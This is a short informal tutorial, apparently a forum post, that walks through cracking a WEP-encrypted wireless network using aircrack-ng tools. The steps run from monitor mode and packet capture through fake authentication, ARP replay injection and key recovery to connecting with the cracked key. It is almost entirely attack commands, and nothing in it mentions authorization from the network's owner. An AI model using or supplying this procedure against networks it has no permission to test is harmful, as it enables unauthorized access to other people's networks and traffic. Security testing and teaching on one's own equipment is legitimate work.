To start check if your adapter allows packet injection:
aireplay -9 mon0

We need to put our wireless interface into monitor mode by doing:
airmon-ng start wlan0
Your interface could posibly be differnt.

Now lets capture the networks using airodump:
airodump-ng mon0

So, lets start listening to our wep network,
airodump-ng -c <channel> -w <file> --bssid 00:00:xxxx <interface>

Now we need to authenticate the network;
aireplay-ng -1 0 -a 00:00:00:00 <interface>

Ok same command again just differnt syntax:
aireplay-ng -3 -b 00:00:00:00 <interface>

Awsome so now we need to prompt a new terminal using the file 
we last set when we were listening to the network it should end with .cap:
aircrack-ng <file>

Ok this could take a few minutes to get enough data to crack the password.

KEY FOUND! [11:111:11:11] << coool!!!! but not done ;)

Connecting to the network, once asked for the password you enter the "11:111:11:11" but delete 
everyone of the ':' so; 11:111:11:11 = 111111111

And thats it for cracking a wep network under 5 minutes :)
